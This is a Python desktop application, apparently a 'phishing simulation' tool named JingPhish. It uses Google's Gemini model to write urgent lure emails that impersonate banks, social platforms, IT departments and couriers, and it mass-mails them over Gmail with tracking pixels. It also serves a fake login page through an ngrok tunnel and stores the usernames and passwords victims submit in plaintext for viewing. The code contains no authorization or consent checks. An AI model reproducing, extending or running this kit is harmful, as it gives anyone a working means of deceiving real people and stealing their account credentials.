import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import sqlite3
import smtplib
import ssl
import threading
import http.server
import socketserver
import time
import requests
import json
import csv
from pyngrok import ngrok, conf
import os
import urllib.parse
from email.message import EmailMessage
import google.generativeai as genai
from datetime import datetime 

PURPOSE_PROMPTS = {
    "Financial": "Create urgent bank security alert email about suspicious transactions needing verification",
    "Social Media": "Generate account verification email for social platform warning about unauthorized logins",
    "Corporate": "Compose IT notice about mandatory password rotation due to system upgrades",
    "Shipping": "Package delivery notification requiring address confirmation with tracking"
}


THANKYOU_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Submission Received</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        .success-icon { color: #4CAF50; font-size: 72px; margin: 20px; }
        .message { font-size: 1.2em; color: #333; margin: 20px; }
    </style>
</head>
<body>
    <div class="success-icon">✓</div>
    <h1>Thank You!</h1>
    <div class="message">
        <p>We have received your request successfully.</p>
        <p>If your details are verified, you will receive a confirmation email shortly.</p>
    </div>
    <p style="color: #666; margin-top: 30px;">
        <a href="/" style="color: #2196F3; text-decoration: none;">Return to Home</a>
    </p>
</body>
</html>
"""

# ========================
# DATABASE INITIALIZATION
# ========================
def create_tables():
    conn = sqlite3.connect('phishsim.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS campaigns
                 (id INTEGER PRIMARY KEY, name TEXT, purpose TEXT, 
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
                 
    c.execute('''CREATE TABLE IF NOT EXISTS targets
                 (id INTEGER PRIMARY KEY, campaign_id INTEGER,
                 email TEXT, first_name TEXT, last_name TEXT,
                 opened INTEGER DEFAULT 0, clicked INTEGER DEFAULT 0,
                 FOREIGN KEY(campaign_id) REFERENCES campaigns(id))''')
                 
    c.execute('''CREATE TABLE IF NOT EXISTS settings
                 (key TEXT PRIMARY KEY, value TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY, target_id INTEGER,
                 username TEXT, password TEXT,
                 submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 FOREIGN KEY(target_id) REFERENCES targets(id))''')
    
    conn.commit()
    conn.close()

create_tables()

# ========================
# CORE APPLICATION CLASS
# ========================
class PhishSimApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("JingPhish v2.3")
        self.geometry("1200x800")
        self.current_campaign = None
        self.ai_model = None
        self.template_content = ""
        self.progress = None
        self.smtp_credentials = {'user': '', 'pass': ''}
        self.public_ip = self.get_public_ip()
        self.server_port = 8080
        self.template_entries = {}
        self.company_entries = {}
        self.ngrok_tunnel = None
        self.ngrok_url = ""
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', padding=5)
        style.configure('TFrame', padding=5)
        
        self.create_widgets()
        self.load_settings()
        self.start_tracking_server()

    def get_public_ip(self):
        try:
            response = requests.get('https://ifconfig.me', timeout=5)
            return response.text.strip()
        except Exception as e:
            messagebox.showwarning("Network Error", "Failed to get public IP, using localhost")
            return "localhost"

    # =====================
    # UI COMPONENTS
    # =====================
    def create_widgets(self):
        self.notebook = ttk.Notebook(self)
        
        # Campaign Tab
        self.campaign_frame = ttk.Frame(self.notebook)
        self.build_campaign_tab()
        
        # Templates Tab
        self.template_frame = ttk.Frame(self.notebook)
        self.build_template_tab()
        
        # Results Tab
        self.results_frame = ttk.Frame(self.notebook)
        self.build_results_tab()
        
        # Settings Tab
        self.settings_frame = ttk.Frame(self.notebook)
        self.build_settings_tab()
        
        self.notebook.add(self.campaign_frame, text="Campaigns")
        self.notebook.add(self.template_frame, text="Templates")
        self.notebook.add(self.results_frame, text="Results")
        self.notebook.add(self.settings_frame, text="Settings")
        self.notebook.pack(expand=True, fill="both")

        # Status Bar
        self.status = tk.Label(self, text="Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status.pack(side=tk.BOTTOM, fill=tk.X)

    def build_campaign_tab(self):
        main_frame = ttk.Frame(self.campaign_frame)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        purpose_frame = ttk.LabelFrame(main_frame, text="1. Select Purpose")
        purpose_frame.grid(row=0, column=0, sticky='ew', padx=5, pady=5)
        ttk.Label(purpose_frame, text="Campaign Purpose:").grid(row=0, column=0, padx=5, pady=5)
        self.purpose = ttk.Combobox(purpose_frame, values=list(PURPOSE_PROMPTS.keys()), state='readonly')
        self.purpose.grid(row=0, column=1, padx=5, pady=5)
        
        template_frame = ttk.LabelFrame(main_frame, text="2. Generate Template")
        template_frame.grid(row=1, column=0, sticky='ew', padx=5, pady=5)
        ttk.Button(template_frame, text="Generate Template", command=self.generate_template).grid(row=0, column=0, padx=5, pady=5)
        
        targets_frame = ttk.LabelFrame(main_frame, text="3. Load Targets")
        targets_frame.grid(row=2, column=0, sticky='ew', padx=5, pady=5)
        ttk.Button(targets_frame, text="Browse CSV", command=self.load_targets).grid(row=0, column=0, padx=5, pady=5)
        
        # Target Treeview with Scrollbar
        self.target_tree = ttk.Treeview(targets_frame, columns=('Email', 'First Name', 'Last Name'), show='headings', height=8)
        self.target_tree.heading('Email', text='Email')
        self.target_tree.column('Email', width=250)
        self.target_tree.heading('First Name', text='First Name')
        self.target_tree.column('First Name', width=150)
        self.target_tree.heading('Last Name', text='Last Name')
        self.target_tree.column('Last Name', width=150)
        self.target_tree.grid(row=1, column=0, padx=5, pady=5)
        
        scroll = ttk.Scrollbar(targets_frame, orient=tk.VERTICAL, command=self.target_tree.yview)
        self.target_tree.configure(yscroll=scroll.set)
        scroll.grid(row=1, column=1, sticky='ns')
        
        launch_frame = ttk.LabelFrame(main_frame, text="4. Launch Campaign")
        launch_frame.grid(row=3, column=0, sticky='ew', padx=5, pady=5)
        ttk.Button(launch_frame, text="Start Phishing Campaign", command=self.launch_campaign).pack(pady=10)
        
        self.progress = ttk.Progressbar(main_frame, orient='horizontal', mode='determinate')
        self.progress.grid(row=4, column=0, sticky='ew', padx=5, pady=10)

    def build_template_tab(self):
        main_frame = ttk.Frame(self.template_frame)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        self.template_editor = tk.Text(main_frame, wrap=tk.WORD, font=('Courier New', 10))
        self.template_editor.pack(expand=True, fill="both", padx=5, pady=5)

    def build_results_tab(self):
        main_frame = ttk.Frame(self.results_frame)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Results Treeview
        self.results_tree = ttk.Treeview(main_frame, columns=('Email', 'Opened', 'Clicked', 'Credentials'), show='headings')
        self.results_tree.heading('#0', text='Campaign')
        self.results_tree.column('#0', width=200)
        self.results_tree.heading('Email', text='Email')
        self.results_tree.column('Email', width=200)
        self.results_tree.heading('Opened', text='Opened')
        self.results_tree.column('Opened', width=80)
        self.results_tree.heading('Clicked', text='Clicked')
        self.results_tree.column('Clicked', width=80)
        self.results_tree.heading('Credentials', text='Credentials')
        self.results_tree.column('Credentials', width=80)
        self.results_tree.pack(expand=True, fill="both", padx=5, pady=5)
        
        # Double-click to view credentials
        self.results_tree.bind('<Double-1>', self.show_credentials)
        
        ttk.Button(main_frame, text="Refresh Results", command=self.load_results).pack(pady=5)

    def build_settings_tab(self):
        main_frame = ttk.Frame(self.settings_frame)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        # SMTP Settings
        smtp_frame = ttk.LabelFrame(main_frame, text="SMTP Settings")
        smtp_frame.grid(row=0, column=0, sticky='ew', padx=5, pady=5)
        
        ttk.Label(smtp_frame, text="Gmail Address:").grid(row=0, column=0, padx=5, pady=2)
        self.smtp_user_entry = ttk.Entry(smtp_frame, width=60)
        self.smtp_user_entry.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Label(smtp_frame, text="App Password:").grid(row=1, column=0, padx=5, pady=2)
        self.smtp_pass_entry = ttk.Entry(smtp_frame, width=60, show="*")
        self.smtp_pass_entry.grid(row=1, column=1, padx=5, pady=2)
        
        # AI Settings
        ai_frame = ttk.LabelFrame(main_frame, text="AI Settings")
        ai_frame.grid(row=1, column=0, sticky='ew', padx=5, pady=5)
        
        ttk.Label(ai_frame, text="Google AI API Key:").grid(row=0, column=0, padx=5, pady=2)
        self.ai_key_entry = ttk.Entry(ai_frame, width=60)
        self.ai_key_entry.grid(row=0, column=1, padx=5, pady=2)
        
        # Template Mappings
        template_frame = ttk.LabelFrame(main_frame, text="Template Mappings")
        template_frame.grid(row=2, column=0, sticky='ew', padx=5, pady=5)
        
        row_num = 0
        self.template_entries = {}
        for purpose in PURPOSE_PROMPTS:
            ttk.Label(template_frame, text=purpose).grid(row=row_num, column=0, padx=5, pady=2)
            entry = ttk.Entry(template_frame, width=50)
            entry.grid(row=row_num, column=1, padx=5, pady=2)
            ttk.Button(template_frame, text="Browse", 
                       command=lambda p=purpose, e=entry: self.set_template_path(p, e)).grid(row=row_num, column=2, padx=5)
            self.template_entries[purpose] = entry
            row_num += 1
        
        # Company Names
        company_frame = ttk.LabelFrame(main_frame, text="Company Names")
        company_frame.grid(row=3, column=0, sticky='ew', padx=5, pady=5)
        
        row_num = 0
        self.company_entries = {}
        for purpose in PURPOSE_PROMPTS:
            ttk.Label(company_frame, text=purpose).grid(row=row_num, column=0, padx=5, pady=2)
            entry = ttk.Entry(company_frame, width=50)
            entry.grid(row=row_num, column=1, padx=5, pady=2)
            self.company_entries[purpose] = entry
            row_num += 1
        ngrok_frame = ttk.LabelFrame(main_frame, text="Ngrok Settings")
        ngrok_frame.grid(row=5, column=0, sticky='ew', padx=5, pady=5)
        
        ttk.Label(ngrok_frame, text="Ngrok Auth Token:").grid(row=0, column=0, padx=5, pady=2)
        self.ngrok_key_entry = ttk.Entry(ngrok_frame, width=60)
        self.ngrok_key_entry.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Label(ngrok_frame, text="Active Ngrok URL:").grid(row=1, column=0, padx=5, pady=2)
        self.ngrok_url_label = ttk.Label(ngrok_frame, text="Not active")
        self.ngrok_url_label.grid(row=1, column=1, padx=5, pady=2)
        # Load existing settings
        self.load_settings_entries()
        
        ttk.Button(main_frame, text="Save Settings", command=self.save_settings).grid(row=4, column=0, pady=10)

    def set_template_path(self, purpose, entry):
        filepath = filedialog.askopenfilename(initialdir="templates", title="Select Template",
                                            filetypes=[("HTML Files", "*.html")])
        if filepath:
            entry.delete(0, tk.END)
            entry.insert(0, os.path.basename(filepath))

    def load_settings_entries(self):
        conn = sqlite3.connect('phishsim.db')
        c = conn.cursor()
        
        # Load template paths
        for purpose in PURPOSE_PROMPTS:
            key = f"{purpose}_template"
            c.execute("SELECT value FROM settings WHERE key=?", (key,))
            result = c.fetchone()
            if result:
                self.template_entries[purpose].delete(0, tk.END)
                self.template_entries[purpose].insert(0, result[0])
        
        # Load company names
        for purpose in PURPOSE_PROMPTS:
            key = f"{purpose}_company"
            c.execute("SELECT value FROM settings WHERE key=?", (key,))
            result = c.fetchone()
            if result:
                self.company_entries[purpose].delete(0, tk.END)
                self.company_entries[purpose].insert(0, result[0])
        
        conn.close()

    # =====================
    # CORE FUNCTIONALITY
    # =====================
    def load_targets(self):
        filepath = filedialog.askopenfilename(filetypes=[("CSV Files", "*.csv")])
        if filepath:
            for child in self.target_tree.get_children():
                self.target_tree.delete(child)
            with open(filepath, 'r',encoding='utf-8') as f:
                reader = csv.reader(f)
                for row in reader:
                    if len(row) >= 3:
                        self.target_tree.insert('', 'end', values=(
                            row[0].strip(), 
                            row[1].strip(), 
                            row[2].strip()
                        ))

    def save_settings(self):
        conn = sqlite3.connect('phishsim.db')
        c = conn.cursor()
        
        # Save SMTP and AI settings
        settings = [
            ('smtp_user', self.smtp_user_entry.get()),
            ('smtp_pass', self.smtp_pass_entry.get()),
            ('google_ai_key', self.ai_key_entry.get())
        ]
        
        # Save template mappings
        for purpose, entry in self.template_entries.items():
            key = f"{purpose}_template"
            settings.append((key, entry.get()))
        
        # Save company names
        for purpose, entry in self.company_entries.items():
            key = f"{purpose}_company"
            settings.append((key, entry.get()))
        settings.append(('ngrok_key', self.ngrok_key_entry.get()))
        for key, value in settings:
            c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)", (key, value))
        
        conn.commit()
        conn.close()
        self.load_settings()
        messagebox.showinfo("Success", "Settings saved successfully")

    def load_settings(self):
        conn = sqlite3.connect('phishsim.db')
        c = conn.cursor()
        c.execute("SELECT key, value FROM settings")
        settings = c.fetchall()
        
        for key, value in settings:
            if key == 'google_ai_key':
                try:
                    genai.configure(api_key=value)
                    self.ai_model = genai.GenerativeModel('gemini-2.0-flash-lite')
                    self.ai_key_entry.delete(0, tk.END)
                    self.ai_key_entry.insert(0, value)
                except Exception as e:
                    messagebox.showerror("AI Error", f"Config failed: {str(e)}")
            elif key == 'smtp_user':
                self.smtp_credentials['user'] = value
                self.smtp_user_entry.delete(0, tk.END)
                self.smtp_user_entry.insert(0, value)
            elif key == 'smtp_pass':
                self.smtp_credentials['pass'] = value
                self.smtp_pass_entry.delete(0, tk.END)
                self.smtp_pass_entry.insert(0, value)
            elif key == 'ngrok_key':  # Ngrok auth token handling
                self.ngrok_key_entry.delete(0, tk.END)
                self.ngrok_key_entry.insert(0, value)
                # Configure pyngrok with the auth token
                try:
                    conf.get_default().auth_token = value
                    self.ngrok_url_label.config(text="Token valid")
                except Exception as e:
                    messagebox.showerror("Ngrok Error", f"Invalid auth token: {str(e)}")
        conn.close()
        self.load_settings_entries()

    def generate_template(self):
        if not self.ai_model:
            messagebox.showerror("Error", "Configure AI API key first!")
            return
            
        purpose = self.purpose.get()
        if not purpose:
            messagebox.showerror("Error", "Select a campaign purpose first!")
            return
        
        # Get company name from settings
        company_key = f"{purpose}_company"
        conn = sqlite3.connect('phishsim.db')
        c = conn.cursor()
        c.execute("SELECT value FROM settings WHERE key=?", (company_key,))
        company_result = c.fetchone()
        company_name = company_result[0] if company_result else "Example Corp"
        conn.close()
        
        prompt = f"""Create professional HTML email template for: {PURPOSE_PROMPTS[purpose]}
        Company Name: {company_name}
        Requirements:
        - Use corporate language with HTML formatting
        - Dont use any variable in the subject 
        - Use all of the following variables ONLY: {{first_name}}, {{last_name}}, {{company}}, {{tracking_link}}
        - Add urgency but keep it realistic
        - Use proper HTML tags for line breaks and paragraphs ( You can use online available images also to look more realistic)
        - NO PLACEHOLDERS you can use any relevant data instead 
        - Tracking Link means the CTA link,i.e, the main link on the web page 
        - Today's Date and time is : {str(datetime.today())} (If you need it )
        - Output JSON with 'subject' and 'body' fields ONLY No extra text
        """
        
        try:
            response = self.ai_model.generate_content(prompt)
            cleaned = response.text.replace('```json', '').replace('```', '').strip()
            email_data = json.loads(cleaned)
            
            self.template_editor.delete(1.0, tk.END)
            self.template_editor.insert(tk.END, 
                f"Subject: {email_data['subject']}\n\n{email_data['body']}")
            self.status.config(text="Template generated successfully")
        except Exception as e:
            messagebox.showerror("AI Error", f"Generation failed: {str(e)}")
            print(cleaned)

    def launch_campaign(self):
        if not all(self.smtp_credentials.values()):
            messagebox.showerror("Error", "Configure SMTP credentials in Settings first!")
            return
            
        targets = []
        for child in self.target_tree.get_children():
            values = self.target_tree.item(child, 'values')
            if len(values) >= 3:
                targets.append((values[0], values[1], values[2]))
        
        if not targets:
            messagebox.showerror("Error", "Load targets first!")
            return
            
        self.template_content = self.template_editor.get("1.0", tk.END)
        threading.Thread(target=self.execute_campaign, args=(targets,), daemon=True).start()
        self.status.config(text="Campaign started...")

    def execute_campaign(self, targets):
        try:
            self.progress['value'] = 0
            total = len(targets)
            
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
                server.login(self.smtp_credentials['user'], self.smtp_credentials['pass'])
                
                conn = sqlite3.connect('phishsim.db')
                c = conn.cursor()
                c.execute("INSERT INTO campaigns (name, purpose) VALUES (?,?)",
                         (f"Campaign {time.time()}", self.purpose.get()))
                campaign_id = c.lastrowid
                
                tracking_base = f"{self.ngrok_url}/track" if self.ngrok_url else f"http://{self.public_ip}:{self.server_port}/track"
               
                purpose = self.purpose.get()
                company_key = f"{purpose}_company"
                c.execute("SELECT value FROM settings WHERE key=?", (company_key,))
                company_result = c.fetchone()
                company_name = company_result[0] if company_result else "Example Corp"
                
                for i, (email, first_name, last_name) in enumerate(targets):
                    try:
                        msg = EmailMessage()
                        msg['From'] = self.smtp_credentials['user']
                        msg['To'] = email
                        
                        # Parse template
                        subject = self.template_content.split('\n')[0].replace("Subject: ", "").strip()
                        body = '\n'.join(self.template_content.split('\n')[2:])
                        
                        # Add tracking
                        open_tracker = f'<img src="{tracking_base}/open/{email}" width="1" height="1">'
                        encoded_email = urllib.parse.quote(email)  # URL-encode email
                        click_tracker = f'{tracking_base}/click/{encoded_email}'
                        body = body.format(
                            first_name=first_name,
                            last_name=last_name,
                            company=company_name,
                            tracking_link=click_tracker
                        )
                        body = body.replace('</body>', f'{open_tracker}</body>')
                        
                        msg['Subject'] = subject
                        msg.add_alternative(body, subtype='html')
                        
                        # Send email
                        server.send_message(msg)
                        
                        # Insert target
                        c.execute("INSERT INTO targets (campaign_id, email, first_name, last_name) VALUES (?,?,?,?)",
                                 (campaign_id, email, first_name, last_name))
                        conn.commit()
                        
                        self.progress['value'] = (i+1)/total*100
                        self.update_idletasks()
                        
                    except Exception as e:
                        continue  # Continue to next target on error
                
                conn.close()
            
            messagebox.showinfo("Success", "Campaign completed!")
            self.status.config(text="Campaign completed")
        except Exception as e:
            messagebox.showerror("Error", f"Campaign failed: {str(e)}")
            self.status.config(text=f"Error: {str(e)}")

    def start_tracking_server(self):
        try:
            if self.ngrok_key_entry.get():
                conf.get_default().auth_token = self.ngrok_key_entry.get()
                self.ngrok_tunnel = ngrok.connect(self.server_port, bind_tls=True)
                self.ngrok_url = self.ngrok_tunnel.public_url
                self.ngrok_url_label.config(text=self.ngrok_url)
                conn = sqlite3.connect('phishsim.db')
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)",
                 ('ngrok_url', self.ngrok_tunnel.public_url))
                conn.commit()
                conn.close()
        except Exception as e:
            messagebox.showerror("Ngrok Error", f"Failed to start tunnel: {str(e)}")

        class TrackingHandler(http.server.SimpleHTTPRequestHandler):
                        # In TrackingHandler class (modified):
            def do_GET(self):
                if self.path.startswith('/track/'):
                    parts = self.path.split('/')
                    if len(parts) < 4:
                        self.send_error(404)
                        return
                        
                    action = parts[2]
                    encoded_email = parts[3]  # Get encoded email from URL
                    email = urllib.parse.unquote(encoded_email)  # Decode special characters
            
                    conn = sqlite3.connect('phishsim.db')
                    c = conn.cursor()
                    c.execute("SELECT value FROM settings WHERE key='ngrok_url'")
                    ngrok_result = c.fetchone()
                    ngrok_url = ngrok_result[0] if ngrok_result else ""
                    print(ngrok_url)
                    if action == 'open':
                        c.execute("UPDATE targets SET opened=1 WHERE email=?", (email,))
                        conn.commit()
                        self.send_response(204)
                        self.end_headers()
                    elif action == 'click':
                        c.execute("UPDATE targets SET clicked=1 WHERE email=?", (email,))
                        conn.commit()
            
                        # Get campaign purpose
                        c.execute("""SELECT campaigns.purpose FROM campaigns 
                                   JOIN targets ON campaigns.id = targets.campaign_id 
                                   WHERE targets.email=?""", (email,))
                        purpose_result = c.fetchone()
                        purpose = purpose_result[0] if purpose_result else 'Financial'
                        
                        # Get template path from settings
                        c.execute("SELECT value FROM settings WHERE key=?", (f"{purpose}_template",))
                        template_result = c.fetchone()
                        template_file = template_result[0] if template_result else None
                        print(template_file)
                        conn.close()
            
                        if template_file and os.path.exists(f"{template_file}"):
                            with open(f"{template_file}", 'r') as f:
                                content = f.read().replace('{{email}}', encoded_email).replace('{{server_ip}}',ngrok_url)  # Pass encoded email
                            self.send_response(200)
                            self.send_header('Content-type', 'text/html')
                            self.send_header('ngrok-skip-browser-warning', 'true')
                            self.end_headers()
                            self.wfile.write(content.encode())
                        else:
                            self.send_error(404)
                    else:
                        self.send_error(404)
                elif self.path == '/thankyou':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(THANKYOU_PAGE.encode())
                else:
                    self.send_error(404)
            
            def do_POST(self):
                if self.path == '/submit':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    params = urllib.parse.parse_qs(post_data.decode())
                    
                    encoded_email = params.get('email', [''])[0]
                    email = urllib.parse.unquote(encoded_email)
                    username = params.get('username', [''])[0]
                    password = params.get('password', [''])[0]
            
                    conn = sqlite3.connect('phishsim.db')
                    c = conn.cursor()
                    c.execute("SELECT id FROM targets WHERE email=?", (email,))
                    target = c.fetchone()
                    if target:
                        c.execute("INSERT INTO credentials (target_id, username, password) VALUES (?,?,?)",
                                 (target[0], username, password))
                        conn.commit()
                    conn.close()
            
                    self.send_response(302)
                    self.send_header('Location', '/thankyou')
                    self.end_headers()
                else:
                    self.send_error(404)
                        
                        
                        
        try:
            self.server = socketserver.TCPServer(("0.0.0.0", self.server_port), TrackingHandler)
            threading.Thread(target=self.server.serve_forever, daemon=True).start()
        except Exception as e:
            print("server already running")

    def load_results(self):
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        conn = sqlite3.connect('phishsim.db')
        c = conn.cursor()
        c.execute("""SELECT campaigns.name, targets.email, 
                    targets.opened, targets.clicked,
                    COUNT(credentials.id) as creds
                    FROM targets
                    JOIN campaigns ON targets.campaign_id = campaigns.id
                    LEFT JOIN credentials ON targets.id = credentials.target_id
                    GROUP BY targets.id""")
        for row in c.fetchall():
            opened = 'Yes' if row[2] else 'No'
            clicked = 'Yes' if row[3] else 'No'
            creds = 'Yes' if row[4] > 0 else 'No'
            self.results_tree.insert('', 'end', text=row[0], 
                                   values=(row[1], opened, clicked, creds))
        conn.close()

    def show_credentials(self, event):
        item = self.results_tree.selection()[0]
        email = self.results_tree.item(item, 'values')[0]
        
        conn = sqlite3.connect('phishsim.db')
        c = conn.cursor()
        c.execute("""SELECT username, password, submitted_at 
                     FROM credentials 
                     JOIN targets ON credentials.target_id = targets.id 
                     WHERE targets.email=?""", (email,))
        creds = c.fetchall()
        conn.close()
        
        cred_window = tk.Toplevel()
        cred_window.title(f"Credentials for {email}")
        
        tree = ttk.Treeview(cred_window, columns=('Username', 'Password', 'Submitted At'), show='headings')
        tree.heading('Username', text='Username')
        tree.heading('Password', text='Password')
        tree.heading('Submitted At', text='Submitted At')
        
        for cred in creds:
            tree.insert('', 'end', values=cred)
        
        tree.pack(fill='both', expand=True)

if __name__ == "__main__":
    app = PhishSimApp()
    app.mainloop()
